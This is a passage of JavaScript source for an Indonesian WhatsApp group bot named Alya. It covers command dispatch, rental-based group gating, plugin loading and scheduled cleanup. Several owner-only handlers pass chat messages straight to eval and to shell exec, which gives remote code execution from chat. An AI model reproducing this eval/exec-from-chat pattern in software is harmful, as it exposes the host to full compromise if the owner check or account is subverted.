        await _duelPlugin.run(alya, m, _duelCtx);
      }
    } catch (e) {
      
      
      console.error('[Duel Handler Error]', e?.stack || e?.message || e);
      try {
        await alya.sendMessage(m.chat, {
          text: `😵 Ada error pas proses aksi duel. Coba ulangi aksinya lagi ya (serang/skill/bertahan/ulti/nyerah).`,
        }, { quoted: m });
      } catch {}
    }
    return;
  }
}

if (!isCmd) return







if (m.isGroup && !Ryuu) {
  
  if (global.sewa) sewa = global.sewa;

  const _isSewa = checkSewaGroup(m.chat, sewa);

  
  if (!_isSewa) {
    
    if (!global._sewaWarnCooldown) global._sewaWarnCooldown = new Map();
    const _warnKey  = m.chat;
    const _warnLast = global._sewaWarnCooldown.get(_warnKey) || 0;
    const _now      = Date.now();

    if (_now - _warnLast > 5 * 60 * 1000) {
      global._sewaWarnCooldown.set(_warnKey, _now);
      const _ownerNum = global.ownernomer || '6285602845943';
      await alya.sendMessage(m.chat, {
        text:
          `╭━━━〔 🤖 *ALYA BOT* 〕━━━⬣\n` +
          `┃\n` +
          `┃ ⚠️ Bot belum aktif di grup ini!\n` +
          `┃\n` +
          `┃ Grup ini *belum terdaftar sewa*.\n` +
          `┃ Bot tidak akan merespon command\n` +
          `┃ sampai sewa diaktifkan.\n` +
          `┃\n` +
          `┣━━━━━━━━━━━━━━━━━━⬣\n` +
          `┃ 📞 *Hubungi Owner untuk sewa:*\n` +
          `┃ wa.me/${_ownerNum}\n` +
          `┃\n` +
          `┃ 💰 *Mulai dari Rp 1.000/hari*\n` +
          `┃ ⚡ Aktivasi cepat 1-5 menit\n` +
          `┃ 🔐 Bot aktif 24 jam penuh\n` +
          `┗━━━━━━━━━━━━━━━━━━⬣`,
      }, { quoted: m });
    }
    return; 
  }

  
  
  
  
  let _isSewaStore = false;
  try {
    if (!global._sewaStore) global._sewaStore = []; 
    _isSewaStore = global._sewaStore.includes(m.chat);
  } catch {}

  if (_isSewaStore) {
    
    const _STORE_ALLOWED_TAGS = new Set([
      'owner', 'admin', 'group', 'info', 'store', 'general'
    ]);

    
    
    let _commandTag = null;
    try {
      const _reg  = global._cmdRegistry || require('./plugins/cmd_registry.json');
      const _pPath = _reg[command];
      if (_pPath) {
        const _pCache = global._cmdPluginCache || {};
        if (!_pCache[_pPath]) {
          try { _pCache[_pPath] = require('./' + _pPath); } catch {}
        }
        const _plug = _pCache[_pPath];
        const _pList = Array.isArray(_plug) ? _plug : (_plug ? [_plug] : []);
        for (const _p of _pList) {
          if (Array.isArray(_p.tags) && _p.tags.length) {
            _commandTag = _p.tags[0];
            break;
          }
        }
      }
    } catch {}

    
    const _STORE_EXPLICIT_WHITELIST = new Set([
      'menu', 'openlist', 'addopenlist', 'delopenlist', 'liststore',
      'addlist', 'dellist', 'list', 'ceksewa', 'sewabot', 'sewa',
      'help', 'start', 'ping',
    ]);

    const _isAllowed =
      _STORE_EXPLICIT_WHITELIST.has(command) ||
      (_commandTag && _STORE_ALLOWED_TAGS.has(_commandTag));

    if (!_isAllowed) {
      
      return;
    }
  }
}


















if (typeof global.DEBUG_DIAG === 'undefined') {
  global.DEBUG_DIAG = false;
}


if (!global._cmdRegistry) {
  global._cmdRegistry = require('./plugins/cmd_registry.json');
}
if (!global._cmdPluginCache) {
  global._cmdPluginCache = {};
}








if (!global._alyaCaseHandler) {
  try {
    global._alyaCaseHandler = require('./Alya.js');
  } catch (e) {
    console.error('[Alya.js Load Error]', e?.message || e);
    global._alyaCaseHandler = null;
  }
}
function _getCmdMode() {
  return (global.db && global.db.others && global.db.others.cmdMode === 'case') ? 'case' : 'plugin';
}

if (global.DEBUG_DIAG) console.log('[DIAG] alya.js dispatcher tercapai. body=', JSON.stringify(body), 'isCmd=', isCmd, 'command=', command, 'matchedPrefix=', matchedPrefix)


const ctx = {
  
  m, 
  command, args, text, q, prefix, body, budy, bady,
  cleanArgs, cleanQ, 
  sender, from, pushname, botNumber,
  
  isCmd, isGroup, isMedia, isImage, isVideo, isAudio, isSticker,
  isQuotedImage, isQuotedVideo, isQuotedSticker, isQuotedAudio,
  isQuotedDocument, isQuotedViewOnce, isQuotedLocation, isQuotedContact,
  
  groupMetadata, groupName, groupMembers, groupAdmins, groupOwner,
  isBotAdmins, isGroupAdmins, isAdmins, isAdminOrOwner,
  
  Ryuu, isPrem, isAly, isAlya, isSewa, jangan,
  
  quoted, mime, qmsg, content, type,
  
  chatUpdate, store,
  
  reply, replyalya, replytolak, replyprem,
  
  senderNumber, chath, pes, messagesC,
  
  waifuList, husbuList, pler,
  prem, 
  owner, 
  setting: global.db.settings?.[botNumber] || {},
  user: global.db.users?.[sender] || {},
  mess: global.mess,
  db: global.db, 
  
  registeredUsers,
  registeredFile,
  generateKodeReg,
  generateAnimeCard,
  fs,
  
  setVoiceModel,
  getVoiceModel,
  getVoiceList,
  
  getEffectiveRole,
  getRoleOf,
  getRoleByCount,
  ROLE_LEVELS,
  ROLE_NAMES,
  handleSetRole,
  handleClearRole,
  
  getChatCount,
  incrementChatCount,
  setChatCount,
  
  formatStatusCard,
  clearUserHistory,
  isAITriggered,
  runAIInteractive,
  
  getDailyInfo,
  incrementDaily,
  resetDailyLimit,
  markLimitMsgShown,
  DAILY_LIMIT_FREE,
  isPremiumUser,
  generateVoice,
  
  listbut2,
  listbut3,
  getWeather,
  isOwn,
  isPT,
  isAdminP,
  isReseller,
  alyaFitur,
  runtime,
  
  mentionByTag,
  mentionByReply,
  participants,
  Input,
  usernya,
  resolveTarget,   
  
  isAutoAiGc,
  openaigc,
  
  isAutoAiGcAlisa,   
  alisagc,           
  
  antibot,
  antibotSettings,
  saveAntibot,
  saveAntibotSettings,
  
  nttoxic,
  badwords,
  saveAntiToxic,
  userWarnings,
  
  db_respon_list,
  addResponList,
  delResponList,
  updateResponList,
  isAlreadyResponList,
  isAlreadyResponListGroup,
  sendResponList,
  getDataResponList,
  uploadwidipe,
  
  BingAlya,
  AlyaAI,
  
  UploadFileUgu: global.UploadFileUgu,
  TelegraPh: global.TelegraPh,
  
  mess: global.mess,
  
  saveDB,
};



const _pluginPath = global._cmdRegistry[command];
if (isCmd && global.DEBUG_DIAG) console.log('[DIAG] alya.js: mencari plugin untuk command=', command, '-> _pluginPath=', _pluginPath, '| mode=', _getCmdMode())


const _kursusCommands = ['kursusjepang','belajarjepangkursus','lanjutbelajar','lanjutjepang','soaljepang','soalsekarang','progreskuliah','progresJepang','statusbelajar','resetbelajar','resetkursus']
if (isCmd && _kursusCommands.includes(command)) {
  const _kPluginList = Array.isArray(_kursusJepangPlugins) ? _kursusJepangPlugins : [_kursusJepangPlugins]
  for (const _kp of _kPluginList) {
    if (typeof _kp.run !== 'function') continue
    if (Array.isArray(_kp.command) && _kp.command.length > 0 && !_kp.command.includes(command)) continue
    if (!Array.isArray(_kp.command)) continue 
    try { await _kp.run(alya, m, ctx) } catch(e) { console.error('[KursusJepang Error]', e?.message || e) }
    break
  }
}










if (m.isGroup && isMute && isCmd && !isAdmins && !Ryuu) {
    const _ONLYADMIN_BYPASS = ['onlyadmin', 'blackbox'];
    if (!_ONLYADMIN_BYPASS.includes(command)) {
        return;
    }
}










if (isCmd && ['switch', 'switchcase', 'switchplugin', 'switchmode'].includes(command)) {
  if (!Ryuu) {
    return replytolak(mess.only.owner);
  }
  if (!global.db.others) global.db.others = {};
  let _targetMode = null;
  if (command === 'switchcase') {
    _targetMode = 'case';
  } else if (command === 'switchplugin') {
    _targetMode = 'plugin';
  } else {
    
    const _arg = (args[0] || '').toLowerCase();
    if (_arg === 'case' || _arg === 'plugin') {
      _targetMode = _arg;
    } else {
      _targetMode = _getCmdMode() === 'case' ? 'plugin' : 'case';
    }
  }
  if (_targetMode === 'case' && !global._alyaCaseHandler) {
    return replytolak(
      `❌ Mode *case* tidak bisa diaktifkan — Alya.js gagal dimuat.\n` +
      `Cek log server (console.error) untuk detail errornya.`
    );
  }
  global.db.others.cmdMode = _targetMode;
  saveDB(global.db);
  const _label = _targetMode === 'case' ? '🅰️ CASE (gaya V13)' : '🔌 PLUGIN (default V20)';
  await reply(
    `✅ *Mode command berhasil diubah!*\n\n` +
    `Mode aktif sekarang: ${_label}\n\n` +
    `_Mode tersimpan sebagai ${_targetMode.toUpperCase()}. Daftar command sekarang SAMA di kedua mode: plugin tetap dipakai bila tersedia, case Alya jadi fallback untuk command yang hanya punya case._`
  );
  return;
}






if (isCmd && command === 'debugdiag') {
  if (!Ryuu) {
    return replytolak(mess.only.owner);
  }
  const _arg = (args[0] || '').toLowerCase();
  if (_arg === 'on') {
    global.DEBUG_DIAG = true;
  } else if (_arg === 'off') {
    global.DEBUG_DIAG = false;
  } else if (_arg !== 'status' && _arg !== '') {
    return reply(`❌ Argumen tidak dikenal. Gunakan:\n${prefix}debugdiag on\n${prefix}debugdiag off\n${prefix}debugdiag status`);
  }
  const _diagLabel = global.DEBUG_DIAG ? '🟢 ON' : '🔴 OFF';
  await reply(
    `🔍 *Debug Diagnostik*\n\n` +
    `Status: ${_diagLabel}\n\n` +
    `_Mengatur log [DIAG*] di alya.js & index.js (deteksi pesan masuk, gate blokir, pencarian plugin, status koneksi). ` +
    `Flag ini runtime-only, akan kembali ke OFF setiap bot restart._`
  );
  return;
}










if (isCmd && !_pluginPath && global._alyaCaseHandler) {
  try {
    await global._alyaCaseHandler(alya, m, ctx);
  } catch (e) {
    console.error('[Alya Case Handler Error]', command, '-', e?.message || e);
  }
  return;
}

if (_pluginPath) {
  
  if (!global._cmdPluginCache[_pluginPath]) {
    try {
      global._cmdPluginCache[_pluginPath] = require('./' + _pluginPath);
    } catch(e) {
      console.error('[Plugin Load Error]', _pluginPath, e.message);
    }
  }
  const plug = global._cmdPluginCache[_pluginPath];
  
  
  
  
  
  if (typeof plug === 'function' && plug.command) {
    
    const _ctxWithConn = { ...ctx, conn: alya };
    try {
      await plug(_ctxWithConn);
    } catch(e) {
      console.error('[Plugin Run Error (fn)]', _pluginPath, e?.message || e);
      try {
        await alya.sendMessage(m.chat, {
          text: `❌ *Terjadi kesalahan saat menjalankan perintah* \`${prefix}${command}\`\n\n\`${e?.message || String(e)}\``
        }, { quoted: m });
      } catch {}
    }
  } else {
  const plugList = Array.isArray(plug) ? plug : (plug ? [plug] : []);
  for (const p of plugList) {
    if (typeof p.run !== 'function') continue;
    
    if (Array.isArray(p.command) && !p.command.includes(command)) continue;
    try {
      await p.run(alya, m, ctx);
    } catch(e) {
      
      console.error('[Plugin Run Error]', _pluginPath, e?.message || e);
      
      try {
        await alya.sendMessage(m.chat, {
          text: `❌ *Terjadi kesalahan saat menjalankan perintah* \`.${command}\`\n\n\`${e?.message || String(e)}\``
        }, { quoted: m });
      } catch {}
    }
    break; 
  }
  } 
} 




if (isCmd && !global._cmdRegistry[command]) {
  try {
    const { findSuggestions } = require('./lib/typo_suggest');
    const suggestions = findSuggestions(command, global._cmdRegistry || {}, {
      maxResults: 3,
      threshold: 0.50,
      minLen: 2,
    });
    if (suggestions.length > 0) {
      const list = suggestions.map(s => `• *${prefix}${s.cmd}* _(${s.pct}% mirip)_`).join('\n');
      await reply(
        `❓ Command *${prefix}${command}* tidak ditemukan.\n\n` +
        `💡 *Maksud kamu mungkin:*\n${list}\n\n` +
        `_Ketik *${prefix}allmenu* untuk lihat semua command_`
      );
    }
  } catch (e) {   }
}


if (budy.startsWith('<')) {
if (!Ryuu) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}


if (budy.startsWith('$')) {
if (!Ryuu) return replytolak(mess.only.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return alya.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return alya.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith('vv')) {
if (!Ryuu) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith(">")) {
if (!Ryuu) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
alya.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
alya.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}
}

if (budy.startsWith('uu')){
if (!Ryuu) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
alya.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}

} catch (err) {







console.error('[Alya Handler Error]', 'command=', typeof command !== 'undefined' ? command : '?', err?.message || util.format(err))
if (err?.stack) console.error(err.stack)
let e = String(err)


try {
  if (typeof isCmd !== 'undefined' && isCmd && typeof m !== 'undefined' && m?.chat) {
    alya.sendMessage(m.chat, {
      text: `❌ *Terjadi kesalahan internal saat memproses command.*\n\n\`${e}\`\n\n_Silakan cek log server untuk detail lengkap._`
    }, { quoted: m }).catch(() => {})
  }
} catch {}
}
}

if (!global._uncaughtExceptionHandlerAlya) {
  global._uncaughtExceptionHandlerAlya = true
  process.on('uncaughtException', function (err) {
    
    
    console.error('[uncaughtException alya.js]', err?.message || err)
    if (err?.stack) console.error(err.stack)
  })
}
function autoClearSession() {
    const sessionDir = './Alyachan';
    const clearInterval = 72 * 60 * 60 * 1000;
    
    setInterval(async () => {
        try {
            const files = fs.readdirSync(sessionDir);
            const filteredFiles = files.filter(file => 
                file.startsWith('pre-key') ||
                file.startsWith('sender-key') ||
                file.startsWith('session-') ||
                file.startsWith('app-state')
            );

            if (filteredFiles.length === 0) {
                console.log(chalk.blue.bold('📂 [AUTO CLEAN] No session files to clean. Everything is tidy! 📑'));
                return;
            }

            console.log(chalk.yellow.bold('📂 [AUTO CLEAN] Starting session cleanup... 🗃️'));
            
            filteredFiles.forEach(file => {
                fs.unlinkSync(path.join(sessionDir, file));
            });

            console.log(chalk.green.bold(`🗃️ [AUTO CLEAN] Successfully removed ${filteredFiles.length} session files! 📂`));
        } catch (error) {
            console.error(chalk.red.bold('📑 [AUTO CLEAN ERROR]'), chalk.red.bold(error));
        }
    }, clearInterval);
}
function autoClearBackup() {
    const backupPath = './database/messagesBackup.json';
    const clearInterval = 1 * 60 * 60 * 1000;
    
    setInterval(async () => {
        try {
            const totalBefore = messagesBackup.size;

            if (totalBefore === 0) {
                console.log(chalk.blue.bold('📂 [AUTO CLEAN BACKUP] Database is already empty. No cleanup needed! 📑'));
                return;
            }

            console.log(chalk.yellow.bold('📂 [AUTO CLEAN BACKUP] Starting message backup cleanup... 🗃️'));
            
            messagesBackup.clear();

            fs.writeFileSync(backupPath, JSON.stringify([], null, 2));

            console.log(chalk.green.bold(`🗃️ [AUTO CLEAN BACKUP] Successfully removed ${totalBefore} cached messages! 📂`));
        } catch (error) {
            console.error(chalk.red.bold('📑 [AUTO CLEAN BACKUP ERROR]'), chalk.red.bold(error));
        }
    }, clearInterval);
}
if (!global._autoClearBackupStarted) {
  global._autoClearBackupStarted = true
  autoClearBackup();
}





if (!global._sewaExpiredCronRegistered) {
  global._sewaExpiredCronRegistered = true;

  const _sewaPath = require('path').join(process.cwd(), 'database', 'sewa.json');

  async function checkAndLeaveExpiredSewa() {
    try {
      
      let sewaData = [];
      try {
        if (!require('fs').existsSync(_sewaPath)) return;
        sewaData = JSON.parse(require('fs').readFileSync(_sewaPath, 'utf-8')) || [];
      } catch (_) { return; }

      const now       = Date.now();
      const aktif     = [];
      const expired   = [];

      for (const entry of sewaData) {
        if (entry.expired === 'PERMANENT') {
          aktif.push(entry);
        } else if (typeof entry.expired === 'number' && entry.expired <= now) {
          expired.push(entry);
        } else {
          aktif.push(entry);
        }
      }

      if (expired.length === 0) return; 

      
      require('fs').writeFileSync(_sewaPath, JSON.stringify(aktif, null, 2), 'utf-8');
      global.sewa = aktif;
      console.log(`[SewaExpired] 🕐 ${expired.length} grup sewa expired, bot akan keluar...`);

      
      for (const entry of expired) {
        const groupId = entry.id;
        let   gcName  = groupId;

        
        try {
          const meta = await global.alya?.groupMetadata(groupId) || await alya.groupMetadata(groupId);
          gcName = meta?.subject || groupId;
        } catch (_) {}

        
        try {
          await alya.sendMessage(groupId, {
            text:
              `╭━━━〔 ⏰ *SEWA HABIS* 〕━━━⬣\n` +
              `┃\n` +
              `┃ 🤖 Bot *Alya* akan meninggalkan grup ini\n` +
              `┃    karena masa sewa telah berakhir.\n` +
              `┃\n` +
              `┃ 💰 Hubungi owner untuk perpanjang sewa:\n` +
              `┃    wa.me/${global.ownernomer || global.owner?.[0] || ''}\n` +
              `┃\n` +
              `┃ ✨ Terima kasih sudah menggunakan Alya!\n` +
              `┗━━━━━━━━━━━━━━━━━━━━━━━━━⬣`
          });
          await new Promise(r => setTimeout(r, 2000)); 
        } catch (_) {}

        
        try {
          await alya.groupLeave(groupId);
          console.log(`[SewaExpired] ✅ Bot keluar dari grup: ${gcName} (${groupId})`);
        } catch (leaveErr) {
          console.error(`[SewaExpired] ❌ Gagal keluar dari ${groupId}:`, leaveErr?.message);
        }

        
        try {
          const ownerJid = (global.ownernomer || global.owner?.[0] || '').replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          if (ownerJid && ownerJid !== '@s.whatsapp.net') {
            const expiredDate = new Date(entry.expired).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
            await alya.sendMessage(ownerJid, {
              text:
                `╭━━━〔 📋 *LAPORAN SEWA HABIS* 〕━━━⬣\n` +
                `┃\n` +
                `┃ 🏷️ Grup  : *${gcName}*\n` +
                `┃ 🆔 ID    : \`${groupId}\`\n` +
                `┃ ⏰ Expired : ${expiredDate}\n` +
                `┃\n` +
                `┃ ✅ Bot sudah keluar dari grup tersebut.\n` +
                `┃\n` +
                `┃ 💡 Perpanjang: \`.addsewa ${groupId} <durasi>\`\n` +
                `┗━━━━━━━━━━━━━━━━━━━━━━━━━⬣`
            });
          }
        } catch (_) {}

        
        await new Promise(r => setTimeout(r, 3000));
      }

    } catch (err) {
      console.error('[SewaExpired] Error:', err?.message || err);
    }
  }

  
  nodecron.schedule('*/5 * * * *', checkAndLeaveExpiredSewa);
  console.log('[SewaExpired] ⏰ Auto-leave sewa expired aktif — cek setiap 5 menit');

  
  setTimeout(checkAndLeaveExpiredSewa, 15000);
}
